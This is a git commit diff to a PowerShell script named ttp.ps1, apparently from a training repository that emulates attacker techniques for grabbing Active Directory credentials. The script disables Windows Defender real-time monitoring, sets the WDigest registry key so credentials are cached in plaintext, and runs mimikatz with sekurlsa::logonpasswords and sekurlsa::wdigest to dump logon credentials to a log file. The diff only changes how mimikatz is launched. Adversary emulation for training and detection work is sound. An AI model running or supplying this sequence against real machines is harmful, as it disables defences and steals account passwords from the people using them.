6af356436d616b70aaed340c97883e2ce4463535
treyescairo-pluralsight <64978363+treyescairo-pluralsight@users.noreply.github.com>
2024-03-06 10:25:32 -0700

    Update ttp.ps1

--- endpoint_attacks/ad_credential_grabbing/ttp.ps1
+++ endpoint_attacks/ad_credential_grabbing/ttp.ps1
@@ -2,5 +2,4 @@ Set-MpPreference -DisableRealtimeMonitoring 1
 
 reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d
 
-$MIMIARGS='"privilege::debug" "log log.txt" "sekurlsa::logonpasswords" "sekurlsa::wdigest" "exit"'
-Start-Process -FilePath "C:\Program Files\mimikatz\x64\mimikatz.exe" -ArgumentList $MIMIARGS
+. C:\"Program Files"\mimikatz\x64\mimikatz.exe "privilege::debug" "log log.txt" "sekurlsa::logonpasswords" "sekurlsa::wdigest" "exit"
